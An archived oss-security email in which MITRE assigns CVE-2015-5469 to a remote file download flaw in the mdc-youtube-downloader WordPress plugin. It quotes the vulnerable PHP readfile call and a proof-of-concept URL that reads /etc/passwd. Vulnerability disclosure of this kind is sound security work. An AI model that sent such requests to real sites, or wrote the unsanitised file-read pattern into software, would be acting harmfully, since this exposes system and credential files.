X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1274" "Friday" "10" "July" "2015" "16:29:44" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20150710202945.005C072E29D@smtpvbsrv1.mitre.org>" "37" "[oss-security] Re: Remote file download in Wordpress Plugin mdc-youtube-downloader v2.1.0" nil nil nil "7" "2015071020:29:44" "[oss-security] Re: Remote file download in Wordpress Plugin mdc-youtube-downloader v2.1.0" (number mark "        cve-assign@m Jul 10   37/1274  " thread-indent "\"[oss-security] Re: Remote file download in Wordpress Plugin mdc-youtube-downloader v2.1.0\"\n") "<0E2AF306-9C75-415A-B4C8-C9E64C7E136A@me.com>" ("<0E2AF306-9C75-415A-B4C8-C9E64C7E136A@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 15872 invoked by uid 550); 10 Jul 2015 20:30:00 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 15806 invoked from network); 10 Jul 2015 20:29:55 -0000
In-Reply-To: <0E2AF306-9C75-415A-B4C8-C9E64C7E136A@me.com>
Message-Id: <20150710202945.005C072E29D@smtpvbsrv1.mitre.org>
Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
Date: Fri, 10 Jul 2015 16:29:44 -0400 (EDT)
From: cve-assign@mitre.org
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: Remote file download in Wordpress Plugin mdc-youtube-downloader v2.1.0
To: larry0@me.com

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

> Title: Remote file download in Wordpress Plugin mdc-youtube-downloader v2.1.0
> Download Site: https://wordpress.org/plugins/mdc-youtube-downloader
> Vendor: https://profiles.wordpress.org/mukto90/
> Vendor Notified: 2015-07-01, removed vulnerable code.

> $file_name = $_GET['file'];
> readfile($file_name);

> /wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd

> https://wordpress.org/plugins/mdc-youtube-downloader/changelog/
> 2.1.1
> Bug fixed.

> https://plugins.trac.wordpress.org/changeset/1191915

Use CVE-2015-5469.

- -- 
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJVoCmmAAoJEKllVAevmvmsykEH/2NbVNQqD4jmraIaIaClJFp5
P4uQY+BySXHguu5H6AbGni64mQ/FpLqYHpWiQPWJXrzf73ws1P04OJSGZwB0hcB6
dTV6F4F0F1cIrefD2eK7INc6B2twPQ5yZ1kFR7fMnQh1uzUNkoPJgzuUN+QVwhmO
4LlQQyW4+fI/oVqqpgttvr4+FVf8ia2ahxtWkKIoKqt2nfb+7zUFa59jqo76y3mB
wm6oYboSh6Gbu6TfG/+EjiZ3KjMvE98ukXQUOXQpV1BlvpBlTYyMi3jibH8vbSJ+
/7f5r/0arvzwac1sh8TWQAo9SOX3sUWGagEsBMPJ+xxgUukr3O0ekeNu78RTuOU=
=7kCT
-----END PGP SIGNATURE-----
